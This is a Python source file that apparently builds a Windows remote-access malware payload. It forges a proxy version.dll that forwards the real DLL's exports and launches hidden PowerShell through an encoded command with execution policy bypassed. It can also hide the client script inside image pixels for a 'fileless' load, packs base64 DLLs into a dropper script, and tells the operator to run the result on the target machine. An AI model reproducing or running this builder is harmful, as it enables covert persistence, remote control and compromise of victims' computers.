from Server import os
from socket import gethostbyname, gethostname
import pefile, subprocess, base64


class BuildClient(object):

    def __init__(self):
        self.clPath = os.path.join(
            os.getcwd(),
            'Client'
        )
        self.IP = gethostbyname(gethostname())

    def __getDllFunc__(self,path):
        return '\n'.join(
            [
                f'#pragma comment(linker,"/export:{i.name.decode()}={path[:-4]}.{i.name.decode()},@{i.ordinal}")'
                for i in pefile.PE(path).DIRECTORY_ENTRY_EXPORT.symbols if i.name != None
            ]
        ).replace('\\','\\\\')

    def __genVersionDll__(self,encPayload):
        payload = self.__getDllFunc__(r'C:\windows\system32\version.dll')
        data = open(
            os.path.join(
                self.clPath,
                'Dll5',
                'Dll5',
                'dllmain.cpp'
            ),'r'
        ).read().splitlines()
        for i in data:
            if 'system("start /b cmd.exe' in i:
                payload+=f'\tsystem("start /b cmd.exe /c powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {encPayload}");\n'
            elif not i.startswith("#pragma comment"): payload += f'{i}\n'
        return payload

    def __genps1payload__(self):
        payload = str()
        for i in open(os.path.join(self.clPath,'client.ps1'),'r'):
            if '$global:SERVIP="192.168.137.1"' in i:
                payload += f'$global:SERVIP="{self.IP}"\n'
            else: payload += i
        return payload

    def cmd(self,command):
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read().strip().decode()

    def __setendPayload__(self,versdll,url):
        res = str()
        pdll = base64.b64encode(
            open(os.path.join(self.clPath,"Dll3","x64","Release","Dll3.dll"),'rb').read()
        ).decode()
        for i in open(os.path.join(self.clPath,'TMPPAY.ps1')).read().splitlines():
            if "$basePropsys = ''" in i:
                res += f"$basePropsys = '{pdll}'\n"
            elif "$baseVersionDll = ''" in i:
                res += f"$baseVersionDll = '{versdll.decode()}'\n"
            elif "$url = '<url to image>'" in i:
                res += f"$url = '{url}'\n"
            else:res+=i
        return res
            


    
    def genFullPayload(self):
        pspath,pathtovers = os.path.join(self.clPath,'client2.ps1'),os.path.join(
                    self.clPath,
                    'Dll5',
                    'Dll5',
                    'vers.dll'
                )
        open(pspath,'w').write(self.__genps1payload__())
        encpayload = r'''$username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1];$UserID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid;$homepath = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\$UserID").ProfileImagePath;'''
        psim = input('To generate a fileless payload, please enter the path to the "Invoke-PsImage" script \n(if you don\'t want to use stenography enter "n"): ')
        url = "$false"
        if psim!='n':
            assert(os.path.isfile(psim))
            pathToImage = input('Please enter the path to an image to integrate the bytes into the pixels: ')
            assert(os.path.isfile(pathToImage))
            psim = open(psim,'r').read()
            psim += f'\nInvoke-PSImage -Script "{pspath}" -Out "$env:APPDATA\P16700.png" -Image "{pathToImage}"'
            open(os.path.join(os.getenv('TEMP'),'09890121233.ps1'),'w').write(psim)
            encpayload += self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}")
            encpayload = base64.b64encode(
                self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}").replace(
                    os.environ['APPDATA'],'$homepath\AppData\Roaming'
                ).encode('UTF-16LE')
            ).decode()  
            verspayload = self.__genVersionDll__(encpayload)
            open(
                os.path.join(
                    self.clPath,
                    'Dll5',
                    'Dll5',
                    'dllmain.cpp'
                ),'w'
            ).write(verspayload)
            print(f"The DLL payload is prepared and ready to go! To complete the process, please open the file at \"{os.path.join(self.clPath,'Dll5','Dll5','dllmain.cpp')}\" using Microsoft Visual Studio 20XX. Once you have opened it, build it and provide the output path here. Alternatively, you can also use GCC compiler.")
            pathtovers = input('-> ')
            url = input(f'This is the final step! Please upload the image located at $env:APPDATA\P16700.png so that the payload can read and embed it into the target memory.\n-> ')
        versdll = base64.b64encode(open(pathtovers,'rb').read())
        endPath = input('Finished! Please specify the path to output the payload: ')
        open(endPath,'w').write(self.__setendPayload__(versdll,url))
        print(f"Please run the following ({endPath}) on the target machine and run Server.py on the server.")
        
BuildClient().genFullPayload()
